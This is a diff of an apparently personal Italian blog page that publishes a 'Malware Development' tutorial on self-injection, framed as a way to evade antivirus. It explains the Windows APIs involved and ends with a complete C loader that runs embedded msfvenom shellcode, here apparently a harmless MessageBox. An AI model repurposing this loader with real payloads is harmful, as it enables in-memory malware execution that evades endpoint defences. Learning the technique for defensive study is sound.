@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prossimamente</title>
+    <title>Self-Injection</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -11,7 +11,7 @@
         <nav class="navbar">
             <div class="nav-container">
                 <div class="nav-logo">
-                    <h2>Articolo 1</h2>
+                    <h2>Self-Injection</h2>
                 </div>
                 <ul class="nav-menu">
                     <li class="nav-item">
@@ -41,135 +41,231 @@
             <nav class="breadcrumb">
                 <a href="index.html">Home</a> → 
                 <a href="blog.html">Blog</a> → 
-                <span>Analisi Malware</span>
+                <span>Self-Injection</span>
             </nav>
 
             <article class="article-content">
                 <header class="article-header">
                     <div class="article-meta">
-                        <span class="article-date">15 Settembre 2025</span>
-                        <span class="article-category">Tecnologia</span>
-                        <span class="reading-time">Tempo di lettura: 5 minuti</span>
+                        <span class="article-date">16 Settembre 2025</span>
+                        <span class="article-category">Malware Development</span>
                     </div>
-                    <h1>Analisi Malware</h1>
+                    <h1>Self-injection</h1>
                     <p class="article-subtitle">
-                        Pros...
+                        Self-Injection è una tecnica di Process Injection in cui un processo inietta ed esegue codice all'interno del proprio spazio di memoria.
                     </p>
                 </header>
-
                 <div class="article-body">
                     <section>
                         <h2>Introduzione</h2>
                         <p>
-                            Prossimamente....
+                            Il miglior modo per evadere un antivirus, nella teoria, è sfruttare attacchi che non richiedono di scrivere file su disco, ma che agiscono direttamente in memoria.
+                            Come sappiamo, ogni processo ha uno spazio di memoria dedicato.
                         </p>
-                        
                         <p>
-                            
-
+                            Tutti gli attacchi di injection hanno in comune tre step fondamentali:
+                            1) Allocazione della memoria per lo shellcode che vogliamo eseguire; 2) Scrittura dello shellcode nella memoria allocata; 3) Esecuzione dello shellcode.
+                            Oggi parliamo della <strong>Self-Injection</strong>.
                         </p>
                     </section>
 
                     <section>
-                        <h2> </h2>
+                        <h2>Self-Injection</h2>
                         <p>
-                           
-
-                        </p>
-                        
-                        <p>
-                           
+                            La self-injection è un termine generico che indica quando un processo inserisce, scrive o genera codice eseguibile nella propria memoria e poi lo esegue.
+                            Questo avviene tipicamente tramite chiamate alle Windows API.
                         </p>
                     </section>
 
                     <section>
-                        <h2> </h2>
+                        <h2>Shellcode</h2>
                         <p>
-                           
+                            Per prima cosa dobbiamo avere una shellcode da iniettare. In ambito didattico si può ottenere, ad esempio, con strumenti come <code>msfvenom</code>.
                         </p>
-                        
                         <ul>
-                            <li></li>
-                            <li> </li>
-                            <li> </li>
-                            <li> </li>
-                            <li> </li>
-                        </ul>
-                        
-                        <p>
-                             
-                        </p>
-                    </section>
-
-                    <section>
-                        <h2> </h2>
-                        <p>
-                           
-                        </p>
-                        
-                        <p>
-                            
-                        </p>
-                        
-                        <ul>
-                            <li> </li>
-                            <li> </li>
-                            <li> </li>
-                            <li></li>
-                            <li> </li>
+                            <li>
+                                Esempio puramente illustrativo di generazione:
+                                <code>msfvenom -p windows/messagebox TEXT="Self-Injection" TITLE="Self-Injection" -f c"</code>
+                            </li>
+                            <li>Questo comando genera byte che, se correttamente formattati e destinati all'architettura giusta, mostrerebbero una MessageBox.</li>
                         </ul>
                     </section>
 
                     <section>
-                        <h2> </h2>
+                        <h2>API principali usate</h2>
                         <p>
-                           
+                            Nel nostro esempio le API fondamentali sono:
                         </p>
-                        
-                        <p>
-                            
-                        </p>
-                        
                         <ul>
-                            <li> </li>
-                            <li> </li>
-                            <li> </li>
-                            <li> </li>
+                            <li><strong>VirtualAlloc</strong> → alloca la memoria nello spazio del processo</li>
+                            <li><strong>RtlCopyMemory</strong> → copia i dati (la shellcode) nella memoria allocata</li>
+                            <li><strong>CreateThread</strong> → crea un thread che può eseguire il codice nella memoria allocata</li>
+                            <li><strong>WaitForSingleObject</strong> → mantiene il processo in attesa fino alla terminazione del thread</li>
                         </ul>
                     </section>
 
                     <section>
-                        <h2> </h2>
+                        <h2>VirtualAlloc</h2>
+                        <p>Riserva, commit o modifica lo stato di un'area di pagine nello spazio degli indirizzi virtuali del processo chiamante</p>
                         <p>
-                            
+                            La funzione <code>VirtualAlloc</code> richiede i seguenti parametri:
                         </p>
-                        
                         <p>
-                             
+                            <code>
+                                LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+                            </code>
                         </p>
-                        
                         <ul>
-                            <li> </li>
-                            <li> </li>
-                            <li> </li>
-                            <li> </li>
-                            <li> </li>
+                            <li><code>lpAddress</code> → di solito <code>NULL</code>, lascia che il sistema scelga l'indirizzo</li>
+                            <li><code>dwSize</code> → dimensione del buffer da allocare</li>
+                            <li><code>flAllocationType</code> → ad esempio <code>MEM_COMMIT | MEM_RESERVE</code>;</li>
+                            <li><code>flProtect</code> → livello di protezione, es. <code>PAGE_EXECUTE_READWRITE</code>(permesso di lettura,scrittura ed esecuzione)</li>
+                        </ul>
+                        <p>
+                            Esempio:
+                            <code>LPVOID allocated_mem = VirtualAlloc(NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</code>
+                        </p>
+                    </section>
+
+                    <section>
+                        <h2>RtlCopyMemory</h2>
+                        <p>
+                            <code>RtlCopyMemory</code> copia il contenuto di un blocco di memoria sorgente in un blocco di memoria destinazione.
+                        </p>
+                        <p>
+                        <p>
+                            La funzione <code>RtlCopyMemory</code> richiede i seguenti parametri:
+                        </p>
+                            <code>void RtlCopyMemory(void* Destination, const void* Source, size_t Length);</code>
+                        </p>
+                        <ul>
+                            <li><code>Destination</code> → buffer destinazione (deve essere allocato e sufficientemente grande);</li>
+                            <li><code>Source</code> → puntatore ai byte sorgente (lo shellcode);</li>
+                            <li><code>Length</code> → numero di byte da copiare (usa <code>shellcodeLen</code>).</li>
+                        </ul>
+                        <p>
+                            Attenzione pratica: <code>RtlCopyMemory</code> non effettua controlli di bound. Verifica sempre che <code>allocated_mem != NULL</code> e che <code>shellcodeLen &gt; 0</code> prima della copia.
+                        </p>
+                    </section>
+
+                    <section>
+                        <h2>CreateThread</h2>
+                        <p>
+                            <code>CreateThread</code> crea un thread nello spazio di indirizzo del processo chiamante.
+                        </p>
+
+                        <p>
+                            La funzione <code>CreateThread</code> richiede i seguenti parametri:
+                        </p>
+                        <p>
+                            <code>
+                                HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+                            </code>
+                        </p>
+                        <ul>
+                            <li><code>lpThreadAttributes</code> → spesso <code>NULL</code></li>
+                            <li><code>dwStackSize</code> → <code>0</code> per usare la dimensione di stack predefinita</li>
+                            <li><code>lpStartAddress</code> → puntatore alla funzione d'ingresso del thread</li>
+                            <li><code>lpParameter</code> → parametro passato alla funzione</li>
+                            <li><code>dwCreationFlags</code> → <code>0</code> per esecuzione immediata, <code>CREATE_SUSPENDED</code> per creare sospeso</li>
+                            <li><code>lpThreadId</code> → opzionale, se vuoi l'ID del thread</li>
                         </ul>
                     </section>
 
                     <section>
-                        <h2> </h2>
+                        <h2>WaitForSingleObject</h2>
                         <p>
-                            
+                            <code>WaitForSingleObject</code> attende che l'oggetto specificato sia segnalato o che scada il timeout.
                         </p>
-                        
                         <p>
-                           
+                            La funzione <code>WaitForSingleObject</code> richiede i seguenti parametri:
+
+                            <code>DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);</code>
                         </p>
-                        
+                        <ul>
+                            <li><code>hHandle</code> → handle dell'oggetto da attendere</li>
+                            <li><code>dwMilliseconds</code> → tempo massimo di attesa in ms -  <code>INFINITE</code> = attendi indefinitamente</li>
+                        </ul>
+                    </section>
+
+                    <section>
+                        <h2>Conclusione</h2>
                         <p>
-                            
+                            Chiariti i concetti e le API coinvolte, è possibile procedere alla scrittura del codice.
                         </p>
+                        <pre><code>
+
+    #include &lt;Windows.h&gt;
+    #include &lt;stdio.h&gt;
+    unsigned char shellcode[] =
+    "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89"
+    "\xe5\x8b\x52\x0c\x8b\x52\x14\x31\xff\x8b\x72\x28\x0f\xb7"
+    "\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
+    "\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01"
+    "\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x50"
+    "\x01\xd3\x8b\x48\x18\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34"
+    "\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75"
+    "\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01"
+    "\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01"
+    "\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58"
+    "\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\xe8\x0b\x00\x00"
+    "\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x68\x4c"
+    "\x77\x26\x07\xff\xd5\x6a\x00\xe8\x0f\x00\x00\x00\x53\x65"
+    "\x6c\x66\x2d\x49\x6e\x6a\x65\x63\x74\x69\x6f\x6e\x00\xe8"
+    "\x0f\x00\x00\x00\x53\x65\x6c\x66\x2d\x49\x6e\x6a\x65\x63"
+    "\x74\x69\x6f\x6e\x00\x6a\x00\x68\x45\x83\x56\x07\xff\xd5"
+    "\x6a\x00\x68\xf0\xb5\xa2\x56\xff\xd5";
+
+    int main(int argc, char** argv) {
+
+    // Alloca memoria nello spazio dell'applicazione.
+    LPVOID allocated_mem = VirtualAlloc(NULL,sizeof(shellcode),(MEM_COMMIT | MEM_RESERVE),PAGE_EXECUTE_READWRITE);
+
+    // Controllo errore
+    if (allocated_mem == NULL) {
+    printf("Allocazione memoria fallita : codice errore % lu\n", GetLastError());
+    return 1;
+    }
+
+    // Stampa l'indirizzo restituito dall'allocazione per diagnostica.
+    printf("Memoria allocata all'indirizzo: 0x%p\n", allocated_mem);
+
+    // Copia i byte sorgente nella memoria allocata.
+    RtlCopyMemory(allocated_mem, shellcode, sizeof(shellcode));
+
+    printf("Shellcode scritta in memoria con successo!\n");
+
+    // crea un thread che salta all'indirizzo allocato ed  esegue i byte lì presenti
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
+
+    if (hThread == NULL) {
+    DWORD err = GetLastError(); // codice errore WinAPI
+    printf("Errore nella creazione del Thread! Errore: %u\n", err);
+    return 1;
+    }
+    else {
+    printf("Thread creato con successo!\n");
+    }
+
+    // aspetta la terminazione del thread
+    WaitForSingleObject(hThread, INFINITE);
+
+    // Chiude l'handle del thread
+    CloseHandle(hThread);
+
+    //Rilascia la memoria allocata
+    VirtualFree(allocated_mem, 0, MEM_RELEASE);
+
+    // Fine programma
+    return 0;
+    }
+
+</code></pre>
+                        <figure style="max-width:800px; margin:20px auto; text-align:center;">
+                            <img src="self-injection.png" alt="Self-Injection" style="max-width:100%; height:auto;">
+                            <figcaption style="font-size:13px; color:#555; margin-top:6px;">
+                            </figcaption>
+                        </figure>   
                     </section>
                 </div>
 
@@ -179,23 +275,21 @@
                         <a href="article2.html" class="btn btn-primary">Prossimo Articolo →</a>
                     </div>
                 </footer>
-            </article>
-        </div>
-    </main>
 
-    <footer id="contacts">
-        <div class="container">
-            <div class="footer-content">
-                <h3>Contatti</h3>
-                <div class="contact-info">
-                    <p>LinkedIn: <a href="https://it.linkedin.com/in/luigi-schillaci-192404201" target="_blank" rel="noopener noreferrer">Il Mio Profilo</a></p>
-                    <p>GitHub: <a href="https://github.com/LuigiSchillaci19" target="_blank" rel="noopener noreferrer">Il Mio Repository</a></p>
-                </div>
-                <p class="footer-note">© 2025</p>
-            </div>
-        </div>
-    </footer>
 
-    <script src="script.js" defer></script>
+                <footer id="contacts">
+                    <div class="container">
+                        <div class="footer-content">
+                            <h3>Contatti</h3>
+                            <div class="contact-info">
+                                <p>LinkedIn: <a href="https://it.linkedin.com/in/luigi-schillaci-192404201" target="_blank" rel="noopener noreferrer">Il Mio Profilo</a></p>
+                                <p>GitHub: <a href="https://github.com/LuigiSchillaci19" target="_blank" rel="noopener noreferrer">Il Mio Repository</a></p>
+                            </div>
+                            <p class="footer-note">© 2025</p>
+                        </div>
+                    </div>
+                </footer>
+
+                <script src="script.js" defer></script>
 </body>
 </html>
